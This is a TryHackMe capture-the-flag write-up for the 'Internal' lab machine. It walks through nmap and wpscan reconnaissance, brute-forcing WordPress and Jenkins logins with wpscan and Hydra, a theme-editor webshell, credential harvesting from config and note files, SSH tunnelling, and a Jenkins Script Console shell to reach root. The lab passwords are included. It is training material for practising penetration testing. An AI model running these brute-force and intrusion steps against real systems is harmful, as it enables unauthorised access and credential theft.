# TryHackMe - Internal

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Difficulty | Hard |
| OS | Linux + Docker |
| Domain | `internal.thm` |
| Key services | WordPress, SSH, Jenkins in Docker |

## Attack Chain Overview

```text
Web recon -> WordPress user enum -> WPScan brute-force admin
  -> theme editor webshell
  -> www-data shell
  -> wp-config.php and /opt credential discovery
  -> SSH as aubreanna
  -> SSH local forward to Jenkins container
  -> Jenkins brute force
  -> Script Console RCE
  -> container secret hunting
  -> root SSH password
```

## Summary

Internal starts with WordPress under `/blog`. `nuclei` and `wpscan` confirmed WordPress, XML-RPC, and the `admin` user; `wpscan` brute force recovered `admin:my2boys`. The WordPress theme editor was used to replace `404.php` with a PHP webshell and gain command execution as `www-data`.

Local enumeration found WordPress DB credentials, but the useful pivot was `/opt/wp-save.txt`, which leaked `aubreanna`'s password. SSH as `aubreanna` revealed Jenkins on `172.17.0.2:8080`. A local SSH tunnel exposed Jenkins, Hydra recovered `admin:spongebob`, and Jenkins Script Console gave a container shell. Secret hunting inside the container revealed the root SSH password.

## Reconnaissance

Tools: [nmap](../../../tools/recon/nmap.md), [feroxbuster](../../../tools/fuzz/feroxbuster.md), [nuclei](../../../tools/recon/nuclei.md), [wpscan](../../../tools/web/wpscan.md).

```bash
# What it does: perform a full port scan and service version discovery.
# Why here: identify active services like SSH and Apache to map the initial attack surface.
nmap -sS -p- --open -n -Pn --min-rate 5000 $TARGET -oN silent
nmap -sVC -p22,80 $TARGET -oN service
# What it does: brute-force directories and audit the WordPress installation.
# Why here: discover the /blog endpoint and enumerate WordPress users like 'admin' for brute-force attacks.
feroxbuster -u http://internal.thm -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
nuclei -target http://internal.thm/
wpscan --url http://internal.thm/blog -e vp,u
```

## Initial Access

Full technique: [WordPress theme editor webshell](../../../exploits/web-rce/wordpress-theme-editor-webshell.md).

```bash
wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

Edit the theme `404.php` with `PHP_WEBSHELL_PAYLOAD`, then call it with a command or reverse-shell payload.

## User Pivot

Full technique: [WordPress wp-config.php credential reuse](../../../techniques/creds/wordpress-wp-config-credentials.md).

```bash
# What it does: extract database and local credentials.
# Why here: recover MySQL credentials from wp-config.php and identify aubreanna's password in the /opt directory.
cat /var/www/html/wordpress/wp-config.php | grep -E "DB_|host|port"
# What it does: authenticate to MySQL.
# Why here: verify database access and search for further sensitive data or user hashes.
mysql -h localhost -u wordpress -p wordpress123 wordpress
# What it does: navigate to the /opt directory.
# Why here: locate the wp-save.txt file which contains the next set of user credentials.
cd /opt/
# What it does: display the contents of wp-save.txt.
# Why here: retrieve the password for the user 'aubreanna'.
cat wp-save.txt
# What it does: establish an SSH session as aubreanna.
# Why here: move from the web service context to a full system user shell.
ssh aubreanna@$TARGET
```

## Jenkins Pivot

Full techniques: [Jenkins HTTP form brute force](../../../techniques/creds/jenkins-http-form-bruteforce.md), [Jenkins Script Console RCE](../../../exploits/web-rce/jenkins-script-console-rce.md).

```bash
# What it does: establish a local SSH tunnel to the Jenkins container gateway.
# Why here: expose the internal Jenkins management interface on the attacker loopback for credential brute-forcing.
ssh -L 8080:172.17.0.2:8080 aubreanna@$TARGET
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-form-post "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
```

Use `/script` with the Groovy reverse shell from the Jenkins note.

## Root

Full technique: [Docker container secret hunting](../../../techniques/container/docker-secret-hunting.md).

```bash
# What it does: check the current system state and identity inside the container.
# Why here: confirm we are running inside a Docker container and identify the root user context.
cat /proc/self/status | grep -E '^Cap'
# What it does: display the system hostname.
# Why here: verify we are in the 'jenkins' container and not the host machine.
hostname
# What it does: check the filesystem mount points.
# Why here: confirm the use of overlay/aufs filesystems, a strong indicator of a containerized environment.
mount | grep -E 'overlay|aufs'
# What it does: search for sensitive text files in the container.
# Why here: find /opt/note.txt which contains the final root password for the host machine.
find / -name "*.txt" 2>/dev/null | grep -v proc
# What it does: read the discovered secret note.
# Why here: retrieve the root password.
cat /opt/note.txt
# What it does: log in as root via SSH.
# Why here: complete the final pivot from the container back to the host with full administrative privileges.
ssh root@$TARGET
```

## Key Takeaways

- WordPress admin often means RCE when the theme editor is enabled.
- Internal Docker services become reachable with `ssh -L`.
- Jenkins admin plus Script Console equals command execution.

## Related Notes

- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [nuclei](../../../tools/recon/nuclei.md)
- [wpscan](../../../tools/web/wpscan.md)
- [hydra](../../../tools/creds/hydra.md)
- [ssh](../../../tools/pivot/ssh.md)
- [WordPress theme editor webshell](../../../exploits/web-rce/wordpress-theme-editor-webshell.md)
- [WordPress wp-config.php credential reuse](../../../techniques/creds/wordpress-wp-config-credentials.md)
- [Jenkins HTTP form brute force](../../../techniques/creds/jenkins-http-form-bruteforce.md)
- [Jenkins Script Console RCE](../../../exploits/web-rce/jenkins-script-console-rce.md)
- [Docker container secret hunting](../../../techniques/container/docker-secret-hunting.md)
